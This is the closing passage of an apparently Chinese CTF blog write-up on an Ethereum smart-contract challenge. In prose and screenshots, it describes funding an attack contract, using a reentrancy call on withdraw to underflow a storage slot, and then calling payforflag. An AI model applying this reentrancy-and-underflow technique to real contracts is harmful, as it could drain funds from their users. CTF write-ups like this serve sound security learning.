+<p>转账一次+100，所以变成了0xc8即200<br><img src="https://img-blog.csdnimg.cn/img_convert/a5db58e8711a7f0e803c1fd3a5a2bebe.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="step5调用withdraw进行重入攻击"><a href="#step5调用withdraw进行重入攻击" class="headerlink" title="step5调用withdraw进行重入攻击"></a>step5调用withdraw进行重入攻击</h3><p>在这一步时我发现我在本地部署题目合约的时候没给合约里面转eth导致合约的balance为0。。。所以导致第三方合约无法调用withdraw函数。。最终换了个合约地址继续做题0x168892cb672A747F193eb4acA7b964bfb0aA6476，攻击合约为0x6959f5E401E881A35563599397E0345860742111</p>
+<p>这里需要注意就是最开始storage[0x05]为0x02，而我们需要让它减4之后才能下溢出，所以需要将攻击账户的balance增加到400，所以总共需要部署第三方转账合约转三次，一次+100。因为我们调用witudraw进行重入攻击会改变storage[0x05]，所以只有一次机会，不然得重新来一遍。</p>
+<p>转账给攻击合约一直到balance为400<br><img src="https://img-blog.csdnimg.cn/img_convert/fbe31e85d2454c144e2800d39591678e.png" srcset="/img/loading.gif" lazyload></p>
+<p>进行重入攻击<br><img src="https://img-blog.csdnimg.cn/img_convert/53121fccfc6a5b4ae310efb278c0c524.png" srcset="/img/loading.gif" lazyload></p>
+<p>此时storage[0x05]下溢出，就能满足调用payforflag得条件了<br><img src="https://img-blog.csdnimg.cn/img_convert/4e097c721348987cd0fa3ef6aa777cf3.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="调用payforflag"><a href="#调用payforflag" class="headerlink" title="调用payforflag"></a>调用payforflag</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/887c65a5a5d55e01ea5603908b56d641.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1a3c1c342feffbb937b06fcfbe45b024.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这题前前后后做了很久很久，涉及到的知识太多了，虽然在wiki里面把这题推荐放在了介绍Ethereum Storage那一张，也是考察到了相关覆盖Storage的知识，但其它的考点也非常多，融合在一起对于入门一个月的新手讲确实很难了，而且还是个xctf决赛的题。但不得不说还是学到很多。对于重入攻击，溢出，随机数预测，以及eth下的区块链攻击模式有了更深的理解、</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/blockchain/">blockchain</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/08/10/2022-8-10-Ethereum%20Storage(2)/">
+                        <span class="hidden-mobile">Ethereum Storage(2)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        京ICP备2022002829号
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
